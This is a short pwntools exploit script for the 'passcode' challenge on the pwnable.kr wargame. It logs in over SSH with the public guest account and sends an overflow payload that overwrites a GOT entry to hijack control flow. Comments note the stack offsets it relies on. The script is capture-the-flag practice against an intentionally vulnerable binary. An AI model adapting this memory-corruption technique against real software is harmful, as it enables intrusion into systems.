from pwn import *

sh = ssh(user="passcode", host="pwnable.kr", port=2222, password="guest")
p = sh.process("./passcode")
p.sendline(b"a" * 96 + p32(0x804a004))
p.sendline(b"134514135")
p.interactive()

# login esp 0xfff1d310 ebp 0xfff1d338
# welcome esp 0xfff1d2b0 0xfff1d2c8 -- aaaa
# passcode1 -- ebp-0x10=0xfff1d328 passcode2 -- ebp-0xc=0xfff1d32c
